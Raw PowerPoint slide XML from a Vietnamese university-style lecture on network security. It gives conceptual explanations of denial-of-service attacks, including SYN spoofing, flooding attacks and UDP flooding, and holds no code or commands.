                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Giả định: hầu hết các kết nối thành công và do đó bảng được xóa nhanh chóng</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96D74BF3-427B-45D2-88D0-7A14E2273CD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1524001"/>
            <a:ext cx="6096000" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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pPr marL="0" indent="0">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công giả mạo SYN (SYN Spoofing)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Khai thác hành vi trên server mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attacker: Gửi l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>ợng lớn gói tin yêu cầu kết nối SYN với địa chỉ nguồn giả mạo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Server: Ghi lại chi tiết yêu cầu kết nối TCP vào bảng quản lý, gửi SYN-ACK cho địa chỉ nguồn nêu trong gói tin</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Tràn bảng l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>u trữ kết nối TCP trên server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> drop gói SYN từ người dùng hợp lệ  DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US" b="1">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1100531242"/>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AEDB596E-55ED-4A27-998B-7D1CF3E1B82F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công DoS cổ điển</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21507" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{00A04002-2CDE-4FFE-8FC4-C465AB46E406}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" defTabSz="914400">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>Tấn công giả mạo SYN (SYN Spoofing)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Kẻ tấn công thường sử dụng:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> địa chỉ nguồn ngẫu nhiên (địa chỉ mà có thể không tồn tại)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> hoặc của một máy chủ bị quá tải (mà có thể không gửi một RST)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> để ngăn chặn sự trở lại của (hầu hết) các gói reset</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Có lưu lượng giao thông thấp hơn nhiều kiểu tấn công flooding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t> kẻ tấn công có thể ở trên một liên kết mạng có dung l</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>ợng thấp hơn nhiều so với tấn công flooding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mục tiêu: sử dụng địa chỉ không đáp ứng các SYN-ACK với một RST</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4183691239"/>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7742ECB1-9388-4F6E-AC03-5D3E82D8663A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công tràn ngập (Flooding attack) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12291" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1CCA355B-1ED7-476F-82A8-0304D09C4485}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="605183" y="1600200"/>
            <a:ext cx="8915400" cy="4953000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Phân loại dựa trên giao thức mạng được sử dụng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Mục tiêu: để quá tải dung lượng mạng trên một số liên kết đến một máy chủ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>Hầu như bất kỳ loại </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>gói tin tầng mạng nào</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="23556" name="Picture 5" descr="http://www.networkuptime.com/nmap/images/PE_ping.gif">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{792D0C27-CAB1-404E-98EE-943B4F752D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0800" y="3810000"/>
            <a:ext cx="670560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5892485"/>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7742ECB1-9388-4F6E-AC03-5D3E82D8663A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US" sz="3600"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US" sz="3600"/>
              <a:t>ấn công tràn ngập (Flooding attack) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12291" name="Rectangle 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1CCA355B-1ED7-476F-82A8-0304D09C4485}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="605183" y="1600200"/>
            <a:ext cx="8915400" cy="4953000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="8" name="Diagram 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{499B0D13-7C96-4A4E-A907-D26BEBF8BC15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1161196459"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1371600" y="2362200"/>
          <a:ext cx="9144000" cy="3124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25151990"/>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5F113F7D-E12F-42FF-A5D9-85DDEE269F00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>5. Nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> tấn công </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB"/>
              <a:t>t</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ừ chối dịch vụ</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="en-US"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" altLang="en-US"/>
              <a:t>ấn công tràn ngập (Flooding attack) </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25603" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DB28D978-057B-484B-8FC3-EED51013C9A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="2089151"/>
            <a:ext cx="5970588" cy="4267200"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2500" b="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>UDP Flooding</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>User Datagram Protocol (UDP) là một thành phần của bộ IP và cho phép các ứng dụng máy tính gửi thông điệp</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>Một UDP có thể được hướng vào bất kỳ dịch vụ nào (port); nếu dịch vụ không có sẵn, các gói tin bị loại bỏ nhưng mục tiêu tấn công được thực hiện</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> Chiếm dung lượng đ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" altLang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t>ờng truyền</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25604" name="Slide Number Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5A172B0B-D650-4A00-AAE8-A75489CA762F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5353050" y="6356351"/>
            <a:ext cx="23114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80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2800">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="–"/>
              <a:defRPr sz="2400">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:buChar char="•"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buSzPct val="80000"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:srgbClr val="000066"/>
                </a:solidFill>
                <a:latin typeface="Trebuchet MS" panose="020B0603020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buChar char="»"/>
              <a:defRPr sz="2000">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans"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chemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Lucida Sans" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Lucida Sans Unicode" panose="020B0602030504020204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>13</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="25605" name="Picture 2">
            <a:extLst>
